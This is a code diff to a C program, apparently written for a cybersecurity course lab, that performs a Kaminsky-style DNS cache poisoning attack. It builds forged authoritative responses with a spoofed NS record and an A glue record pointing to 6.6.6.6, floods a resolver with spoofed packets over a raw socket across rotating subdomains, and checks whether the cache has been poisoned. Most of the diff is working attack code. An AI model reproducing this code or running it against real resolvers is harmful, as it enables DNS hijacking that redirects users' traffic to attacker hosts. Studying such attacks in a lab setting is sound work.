@@ -149,10 +149,8 @@ int create_kaminsky_response(uint8_t **wire_data, size_t *wire_size, uint16_t tx
     ldns_pkt *pkt = NULL;
     ldns_rr *question_rr = NULL;
     ldns_rr *auth_rr = NULL;
-    ldns_rr *glue_rr = NULL;
     ldns_rdf *owner_rdf = NULL;
     ldns_rdf *ns_rdf = NULL;
-    ldns_rdf *ip_rdf = NULL;
     ldns_status status;
 
     pkt = ldns_pkt_new();
@@ -160,8 +158,6 @@ int create_kaminsky_response(uint8_t **wire_data, size_t *wire_size, uint16_t tx
 
     ldns_pkt_set_qr(pkt, true);
     ldns_pkt_set_aa(pkt, true);
-    // ldns_pkt_set_rd(pkt, false);
-    // ldns_pkt_set_ra(pkt, false);
     ldns_pkt_set_id(pkt, txid);
     ldns_pkt_set_rcode(pkt, LDNS_RCODE_NOERROR);
 
@@ -193,7 +189,7 @@ int create_kaminsky_response(uint8_t **wire_data, size_t *wire_size, uint16_t tx
     auth_rr = ldns_rr_new();
     if (auth_rr) {
         owner_rdf = ldns_dname_new_frm_str("example1.cybercourse.example.com");
-        ns_rdf = ldns_dname_new_frm_str("ns.attacker.cybercourse.example.com");
+        ns_rdf = ldns_dname_new_frm_str("www.example1.cybercourse.example.com");
         if (owner_rdf && ns_rdf) {
             ldns_rr_set_owner(auth_rr, owner_rdf);
             ldns_rr_set_type(auth_rr, LDNS_RR_TYPE_NS);
@@ -204,17 +200,17 @@ int create_kaminsky_response(uint8_t **wire_data, size_t *wire_size, uint16_t tx
         }
     }
 
-    glue_rr = ldns_rr_new();
-    if (glue_rr) {
-        owner_rdf = ldns_dname_new_frm_str("ns.attacker.cybercourse.example.com");
-        ip_rdf = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, "6.6.6.6");
-        if (owner_rdf && ip_rdf) {
-            ldns_rr_set_owner(glue_rr, owner_rdf);
-            ldns_rr_set_type(glue_rr, LDNS_RR_TYPE_A);
-            ldns_rr_set_class(glue_rr, LDNS_RR_CLASS_IN);
-            ldns_rr_set_ttl(glue_rr, 300);
-            ldns_rr_push_rdf(glue_rr, ip_rdf);
-            ldns_pkt_push_rr(pkt, LDNS_SECTION_ADDITIONAL, glue_rr);
+    ldns_rr *target_glue_rr = ldns_rr_new();
+    if (target_glue_rr) {
+        ldns_rdf *target_owner_rdf = ldns_dname_new_frm_str("www.example1.cybercourse.example.com");
+        ldns_rdf *target_ip_rdf = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, "6.6.6.6");
+        if (target_owner_rdf && target_ip_rdf) {
+            ldns_rr_set_owner(target_glue_rr, target_owner_rdf);
+            ldns_rr_set_type(target_glue_rr, LDNS_RR_TYPE_A);
+            ldns_rr_set_class(target_glue_rr, LDNS_RR_CLASS_IN);
+            ldns_rr_set_ttl(target_glue_rr, 300);
+            ldns_rr_push_rdf(target_glue_rr, target_ip_rdf);
+            ldns_pkt_push_rr(pkt, LDNS_SECTION_ADDITIONAL, target_glue_rr);
         }
     }
 
@@ -225,6 +221,7 @@ int create_kaminsky_response(uint8_t **wire_data, size_t *wire_size, uint16_t tx
 }
 
 void send_subdomain_query(const char* domain_name) {
+    //TODO: change the free order inside the ifs
     ldns_rdf *name = NULL;
     ldns_pkt *query = NULL;
     uint8_t *wire = NULL;
@@ -331,7 +328,7 @@ int check_poisoned(void) {
     resolver.sin_port = htons((RESOLVER_DNS_PORT));
     inet_pton(AF_INET, RESOLVER_IP, &resolver.sin_addr);
 
-    printf("[CLIENT] Sending subdomain query -> resolver (%s:53)..\n", RESOLVER_IP);
+    //printf("[CLIENT] Sending subdomain query -> resolver (%s:53)..\n", RESOLVER_IP);
 
     if (sendto(udp_sockfd, wire, wire_size, 0, (struct sockaddr*)&resolver, sizeof(resolver)) < 0) {
         printf("sendto failed..");
@@ -483,7 +480,7 @@ int send_spoof_burst(const char *subdomain, int resolver_port, int budget) {
 
         if (packets_sent % 500 == 0 && packets_sent > 0) {
             //usleep(100);
-            printf("[SPOOF] Sent %d packets so far...\n", packets_sent);
+            //printf("[SPOOF] Sent %d packets so far...\n", packets_sent);
         }
     }
     close(raw_socket);
@@ -524,7 +521,7 @@ int main(void) {
     int resolver_port;
     recv(sockfd, &resolver_port, sizeof(resolver_port), 0);
 
-    printf("Client received: %d\n", resolver_port);
+    //printf("Client received: %d\n", resolver_port);
 
     close(sockfd);
 
@@ -535,7 +532,7 @@ int main(void) {
     for (int round = 0; round < MAX_ROUNDS && total_spoofed < MAX_SPOOFED; round++) {
         char subdomain[256];
         snprintf(subdomain, sizeof(subdomain), "ww%d.example1.cybercourse.example.com", round);
-        printf("[CLIENT] == ROUND %d, subdomain: %s ===\n", round, subdomain);
+        //printf("[CLIENT] == ROUND %d, subdomain: %s ===\n", round, subdomain);
 
         send_subdomain_query(subdomain);
         usleep(6);
@@ -543,7 +540,7 @@ int main(void) {
         int sent_now = send_spoof_burst(subdomain, resolver_port, budget);
         total_spoofed = total_spoofed + sent_now;
 
-        printf("[CLIENT] Total spoofed so far: %d (limit %d)\n", total_spoofed, MAX_SPOOFED);
+        //printf("[CLIENT] Total spoofed so far: %d (limit %d)\n", total_spoofed, MAX_SPOOFED);
         if (check_poisoned()) {
             break;
         }
